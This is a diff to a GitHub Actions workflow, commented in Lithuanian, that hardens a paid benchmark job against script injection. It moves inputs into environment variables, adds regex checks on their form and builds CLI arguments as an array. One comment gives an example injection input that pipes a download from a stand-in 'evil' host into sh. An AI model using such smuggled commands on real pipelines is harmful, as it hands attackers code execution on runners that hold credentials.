@@ -32,10 +32,16 @@ on:
         required: false
         default: "3"
       runner:
-        description: "Bėgikas mokamai šakai. Hosted runner NETURI autentifikuoto agento — reikia self-hosted."
-        type: string
+        # `choice`, ne laisvas tekstas: `runs-on` nėra shell'as, tad injekcijos čia nėra, bet
+        # laisvas laukas, sprendžiantis KURIAME bėgike suksis mokamas darbas, apsaugotame
+        # workflow'e neturi ką veikti. Dvi reikšmės ir yra visas realus pasirinkimas.
+        description: "Bėgikas mokamai šakai. Hosted runner NETURI autentifikuoto agento."
+        type: choice
         required: false
         default: "self-hosted"
+        options:
+          - "self-hosted"
+          - "ubuntu-latest"
   schedule:
     # Kas savaitę, pirmadienį 04:00 UTC. Tvarkaraštis liečia TIK nemokamą šaką.
     - cron: "0 4 * * 1"
@@ -113,12 +119,43 @@ jobs:
             exit 1
           fi
           claude --version
-      - name: Planas prieš vykdymą
+      # Įvestys keliauja per `env`, NIEKADA ne į `run:` tekstą.
+      #
+      # `${{ }}` išskleidžiamas PRIEŠ shell'ui pradedant skaityti programą, tad įvestis
+      # `a"; curl evil | sh; echo "` nebūtų argumentas — ji būtų kodas. Čia tai reikštų savavališką
+      # komandą self-hosted bėgike, kuris laiko autentifikuotą agentą ir prieigą prie repo, ir
+      # kurio niekas neatstato tarp paleidimų. `"$MODES"` yra kita: shell'as pakeičia reikšmę ir
+      # jos NEperskaito iš naujo, tad metaženklai lieka simboliais.
+      - name: Patikrinti įvesčių formą
+        env:
+          MODES: ${{ inputs.modes }}
+          SCENARIOS: ${{ inputs.scenarios }}
+          REPETITIONS: ${{ inputs.repetitions }}
         run: |
-          node dist/cli.js benchmark run --dry-run --allow-network \
-            --mode "${{ inputs.modes }}" \
-            --repetitions "${{ inputs.repetitions }}" \
-            ${{ inputs.scenarios != '' && format('--scenario "{0}"', inputs.scenarios) || '' }}
+          # Forma tikrinama ir čia, nors CLI ją tikrina irgi: atmetimas PRIEŠ mokamą šaką yra
+          # pigesnis, o siauras leidžiamų simbolių rinkinys paverčia keistą įvestį klaida, ne
+          # kelione gilyn. Tai antra gynybos eilė, ne pirma — pirma yra `env` aukščiau.
+          if ! printf '%s' "$MODES" | grep -Eq '^[a-z-]+(,[a-z-]+)*$'; then
+            echo "::error::modes: leidziami tik rezimu vardai, atskirti kableliais"
+            exit 1
+          fi
+          if [ -n "$SCENARIOS" ] && ! printf '%s' "$SCENARIOS" | grep -Eq '^[a-z0-9-]+(,[a-z0-9-]+)*$'; then
+            echo "::error::scenarios: leidziami tik scenariju id, atskirti kableliais"
+            exit 1
+          fi
+          if ! printf '%s' "$REPETITIONS" | grep -Eq '^[0-9]{1,2}$'; then
+            echo "::error::repetitions: leidziamas tik skaicius"
+            exit 1
+          fi
+      - name: Planas prieš vykdymą
+        env:
+          MODES: ${{ inputs.modes }}
+          SCENARIOS: ${{ inputs.scenarios }}
+          REPETITIONS: ${{ inputs.repetitions }}
+        run: |
+          args=(benchmark run --dry-run --allow-network --mode "$MODES" --repetitions "$REPETITIONS")
+          if [ -n "$SCENARIOS" ]; then args+=(--scenario "$SCENARIOS"); fi
+          node dist/cli.js "${args[@]}"
       - name: Pilnas paleidimas
         env:
           # Persiunčiami TIK tie kintamieji, kuriuos paketas deklaruoja
@@ -126,11 +163,13 @@ jobs:
           # diegimas autentifikuojasi pats, ir raktas čia nėra privalomas.
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
           CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
+          MODES: ${{ inputs.modes }}
+          SCENARIOS: ${{ inputs.scenarios }}
+          REPETITIONS: ${{ inputs.repetitions }}
         run: |
-          node dist/cli.js benchmark run --allow-network \
-            --mode "${{ inputs.modes }}" \
-            --repetitions "${{ inputs.repetitions }}" \
-            ${{ inputs.scenarios != '' && format('--scenario "{0}"', inputs.scenarios) || '' }}
+          args=(benchmark run --allow-network --mode "$MODES" --repetitions "$REPETITIONS")
+          if [ -n "$SCENARIOS" ]; then args+=(--scenario "$SCENARIOS"); fi
+          node dist/cli.js "${args[@]}"
       - name: Ataskaita
         if: always()
         run: node dist/cli.js benchmark report --format markdown
